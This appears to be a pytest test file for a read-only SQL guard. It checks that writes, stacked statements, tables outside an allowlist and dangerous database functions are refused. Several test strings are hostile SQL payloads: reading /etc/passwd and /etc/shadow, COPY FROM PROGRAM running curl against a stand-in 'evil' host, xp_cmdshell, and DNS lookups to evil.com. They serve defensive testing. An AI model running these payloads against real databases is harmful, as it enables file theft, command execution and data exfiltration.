"""The guard is the customer's last line of defence, so its tests read like a threat list.

Each case here is something that must never reach the database, or something legitimate
that must never be blocked — a guard that rejects honest analytical SQL gets switched off,
and a guard that is switched off protects nobody.
"""

from __future__ import annotations

import pytest
import sqlglot

from qlar_data_gateway.guard import SqlRejected, check, referenced_tables


def assert_rejected(sql: str, provider: str = "postgresql", **kwargs) -> str:
    with pytest.raises(SqlRejected) as caught:
        check(sql, provider, **kwargs)
    return caught.value.reason


class TestOnlyReadsAreAllowed:
    def test_plain_select_passes(self):
        check("SELECT id, name FROM customers WHERE city = 'Surabaya'", "postgresql")

    def test_cte_and_join_and_aggregate_pass(self):
        check(
            """
            WITH recent AS (SELECT * FROM shipment_order WHERE created_at > now() - interval '30 days')
            SELECT h.city, COUNT(*) AS jobs, SUM(r.revenue) AS revenue
            FROM recent r JOIN hub h ON h.id = r.origin_hub_id
            GROUP BY h.city ORDER BY revenue DESC
            """,
            "postgresql",
        )

    def test_union_passes(self):
        check("SELECT id FROM a UNION ALL SELECT id FROM b", "postgresql")

    @pytest.mark.parametrize(
        "sql",
        [
            "INSERT INTO customers (name) VALUES ('x')",
            "UPDATE customers SET name = 'x'",
            "DELETE FROM customers",
            "DROP TABLE customers",
            "CREATE TABLE t (id int)",
            "ALTER TABLE customers ADD COLUMN x int",
            "TRUNCATE customers",
            "GRANT SELECT ON customers TO public",
        ],
    )
    def test_writes_and_ddl_are_refused(self, sql):
        assert_rejected(sql)

    def test_multiple_statements_are_refused(self):
        # The classic escape: a legitimate read with something appended after a semicolon.
        reason = assert_rejected("SELECT 1; DROP TABLE customers")
        assert "one statement" in reason or "not allowed" in reason

    def test_trailing_semicolon_alone_is_fine(self):
        check("SELECT 1;", "postgresql")


class TestEscapeHatches:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT lo_import('/etc/shadow')",
            "SELECT dblink('host=evil', 'SELECT 1')",
            "SELECT pg_sleep(30)",
        ],
    )
    def test_postgres_file_and_network_functions_are_refused(self, sql):
        assert_rejected(sql)

    def test_copy_from_program_is_refused(self):
        assert_rejected("COPY t FROM PROGRAM 'curl http://evil/x'")

    def test_mysql_load_file_and_outfile_are_refused(self):
        assert_rejected("SELECT load_file('/etc/passwd')", "mysql")
        assert_rejected("SELECT * FROM t INTO OUTFILE '/tmp/x'", "mysql")

    def test_sqlserver_shell_and_openrowset_are_refused(self):
        assert_rejected("SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')", "sqlserver")
        assert_rejected("EXEC xp_cmdshell 'dir'", "sqlserver")

    def test_oracle_utl_packages_are_refused(self):
        assert_rejected("SELECT UTL_INADDR.get_host_address('evil.com') FROM dual", "oracle")

    def test_comment_obfuscation_does_not_help(self):
        # A parser sees through this; a regex over raw text would not.
        assert_rejected("SELECT 1 /* harmless */ ; /* also harmless */ DROP TABLE t")

    def test_unparseable_sql_is_refused_rather_than_guessed(self):
        reason = assert_rejected("SELECT FROM WHERE ((((")
        assert "parsed" in reason or "one statement" in reason


class TestTableAllowlist:
    ALLOWED = frozenset({"public.customers", "orders"})

    def test_allowed_table_passes(self):
        check("SELECT * FROM public.customers", "postgresql", allowlist=self.ALLOWED)

    def test_unqualified_name_matches_bare_entry(self):
        check("SELECT * FROM orders", "postgresql", allowlist=self.ALLOWED)

    def test_unqualified_query_matches_a_schema_qualified_entry(self):
        # An operator writes `public.customers` in their config; the generated SQL says
        # `FROM customers`. If these did not match, the allowlist would reject almost
        # every real query and would simply be switched off.
        check("SELECT * FROM customers", "postgresql", allowlist=self.ALLOWED)

    def test_qualified_query_matches_a_bare_entry(self):
        check("SELECT * FROM public.orders", "postgresql", allowlist=self.ALLOWED)

    def test_a_different_schema_with_the_same_table_name_is_refused(self):
        # The allowlist says public.customers, so a same-named table in another schema is
        # a different table and must not slip through on its name alone.
        reason = assert_rejected("SELECT * FROM secret.customers", allowlist=self.ALLOWED)
        assert "TABLE_ALLOWLIST" in reason

    def test_table_outside_the_list_is_refused(self):
        reason = assert_rejected("SELECT * FROM salaries", allowlist=self.ALLOWED)
        assert "TABLE_ALLOWLIST" in reason

    def test_a_join_onto_a_forbidden_table_is_refused(self):
        assert_rejected(
            "SELECT c.id FROM orders o JOIN salaries s ON s.id = o.id",
            allowlist=self.ALLOWED,
        )

    def test_cte_name_is_not_mistaken_for_a_table(self):
        # Without this, every allowlist would reject perfectly ordinary CTE queries.
        check(
            "WITH recent AS (SELECT * FROM orders) SELECT * FROM recent",
            "postgresql",
            allowlist=self.ALLOWED,
        )


class TestCatalogOnlyMode:
    def test_information_schema_is_allowed(self):
        check("SELECT table_name FROM information_schema.tables", "postgresql", catalog_only=True)

    def test_pg_catalog_is_allowed(self):
        check("SELECT relname FROM pg_catalog.pg_class", "postgresql", catalog_only=True)

    def test_a_business_table_is_refused_during_introspection(self):
        # Schema discovery has no business reading rows out of customer tables.
        reason = assert_rejected(
            "SELECT * FROM customers", catalog_only=True
        )
        assert "catalog" in reason

    def test_oracle_user_views_are_allowed(self):
        check("SELECT table_name FROM user_tables", "oracle", catalog_only=True)

    def test_postgres_system_catalogs_are_allowed_unqualified(self):
        # pg_catalog is on PostgreSQL's default search_path, so catalog SQL says `pg_constraint`,
        # not `pg_catalog.pg_constraint`. It also has to: information_schema hides constraints
        # from anyone who does not own the table, which a read-only account never does, so
        # primary and foreign keys can only be discovered through these views.
        check(
            "SELECT conname FROM pg_constraint con JOIN pg_class cl ON cl.oid = con.conrelid",
            "postgresql",
            catalog_only=True,
        )

    def test_a_business_table_is_still_refused_alongside_catalog_ones(self):
        assert_rejected(
            "SELECT * FROM pg_class, customers",
            catalog_only=True,
        )


class TestReferencedTables:
    def test_collects_schema_qualified_names_and_skips_ctes(self):
        statement = sqlglot.parse_one(
            "WITH t AS (SELECT * FROM sales.orders) SELECT * FROM t JOIN public.customers c ON true",
            dialect="postgres",
        )
        assert referenced_tables(statement) == {"sales.orders", "public.customers"}
